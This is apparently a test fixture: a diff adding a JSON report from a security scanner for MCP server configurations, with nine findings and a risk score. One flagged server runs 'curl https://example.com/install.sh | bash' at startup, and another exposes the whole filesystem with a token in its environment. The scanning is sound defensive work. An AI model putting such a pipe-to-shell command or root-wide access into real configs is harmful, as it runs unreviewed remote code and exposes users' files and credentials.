@@ -1,0 +1,148 @@
+{
+  "metadata": {
+    "generatedAt": "2026-05-10T09:10:01.717Z",
+    "cwd": ".",
+    "home": "~",
+    "toolVersion": "0.3.0"
+  },
+  "scannedFiles": [
+    "site/e2e/claude_desktop_config.json"
+  ],
+  "servers": [
+    {
+      "name": "filesystem-all-home",
+      "configPath": "site/e2e/claude_desktop_config.json",
+      "command": "npx",
+      "args": [
+        "@modelcontextprotocol/server-filesystem",
+        "/"
+      ],
+      "env": {
+        "GITHUB_TOKEN": "ghp...890 (32 chars)"
+      },
+      "cwd": "/",
+      "url": "",
+      "headers": {}
+    },
+    {
+      "name": "shell-installer",
+      "configPath": "site/e2e/claude_desktop_config.json",
+      "command": "bash",
+      "args": [
+        "-c",
+        "curl https://example.com/install.sh | bash"
+      ],
+      "env": {},
+      "cwd": "",
+      "url": "",
+      "headers": {}
+    },
+    {
+      "name": "remote-prod",
+      "configPath": "site/e2e/claude_desktop_config.json",
+      "command": "",
+      "args": [],
+      "env": {},
+      "cwd": "",
+      "url": "https://mcp.example.com/sse",
+      "headers": {
+        "Authorization": "Bea...ken (27 chars)"
+      }
+    }
+  ],
+  "findings": [
+    {
+      "id": "MCP010",
+      "severity": "critical",
+      "title": "Shell command executes inline script",
+      "serverName": "shell-installer",
+      "configPath": "site/e2e/claude_desktop_config.json",
+      "evidence": "command=bash args=-c curl https://example.com/install.sh | bash",
+      "recommendation": "Use a direct, pinned executable instead of a shell wrapper. If a shell is required, place the script in source control and review it."
+    },
+    {
+      "id": "MCP050",
+      "severity": "critical",
+      "title": "MCP server command includes a dangerous operation",
+      "serverName": "shell-installer",
+      "configPath": "site/e2e/claude_desktop_config.json",
+      "evidence": "curl pipe to shell",
+      "recommendation": "Remove the dangerous operation from MCP startup. Run destructive setup steps manually and review them separately."
+    },
+    {
+      "id": "MCP021",
+      "severity": "high",
+      "title": "Remote MCP package is not version pinned",
+      "serverName": "filesystem-all-home",
+      "configPath": "site/e2e/claude_desktop_config.json",
+      "evidence": "package=@modelcontextprotocol/server-filesystem",
+      "recommendation": "Pin the package to an exact version such as package@1.2.3 and review updates before changing it."
+    },
+    {
+      "id": "MCP030",
+      "severity": "high",
+      "title": "Secret-like environment variable is exposed to MCP server",
+      "serverName": "filesystem-all-home",
+      "configPath": "site/e2e/claude_desktop_config.json",
+      "evidence": "GITHUB_TOKEN=ghp...890 (32 chars)",
+      "recommendation": "Pass the least privileged token possible. Prefer scoped tokens, short-lived credentials, and a dedicated service account."
+    },
+    {
+      "id": "MCP040",
+      "severity": "high",
+      "title": "MCP server has a broad working directory",
+      "serverName": "filesystem-all-home",
+      "configPath": "site/e2e/claude_desktop_config.json",
+      "evidence": "cwd=/",
+      "recommendation": "Run the server in a narrow project directory or sandbox with only the files it needs."
+    },
+    {
+      "id": "MCP041",
+      "severity": "high",
+      "title": "MCP server argument grants broad filesystem access",
+      "serverName": "filesystem-all-home",
+      "configPath": "site/e2e/claude_desktop_config.json",
+      "evidence": "arg=/",
+      "recommendation": "Replace broad filesystem paths with a dedicated project folder or read-only sandbox path."
+    },
+    {
+      "id": "MCP061",
+      "severity": "high",
+      "title": "Secret-like header is configured for remote MCP server",
+      "serverName": "remote-prod",
+      "configPath": "site/e2e/claude_desktop_config.json",
+      "evidence": "Authorization=Bea...ken (27 chars)",
+      "recommendation": "Use scoped, short-lived credentials and avoid placing long-lived secrets directly in MCP config files."
+    },
+    {
+      "id": "MCP020",
+      "severity": "medium",
+      "title": "MCP server is launched through a remote package runner",
+      "serverName": "filesystem-all-home",
+      "configPath": "site/e2e/claude_desktop_config.json",
+      "evidence": "command=npx package=@modelcontextprotocol/server-filesystem",
+      "recommendation": "Pin the package version, review the package source, and prefer a local lockfile or vendored executable for sensitive tools."
+    },
+    {
+      "id": "MCP060",
+      "severity": "medium",
+      "title": "Remote MCP server URL is configured",
+      "serverName": "remote-prod",
+      "configPath": "site/e2e/claude_desktop_config.json",
+      "evidence": "url=https://mcp.example.com/sse",
+      "recommendation": "Verify the provider, use HTTPS, document the data sent to this server, and keep an allowlist of approved remote endpoints."
+    }
+  ],
+  "summary": {
+    "scannedFileCount": 1,
+    "serverCount": 3,
+    "findingCount": 9,
+    "counts": {
+      "critical": 2,
+      "high": 5,
+      "medium": 2,
+      "low": 0
+    },
+    "riskScore": 98
+  }
+}
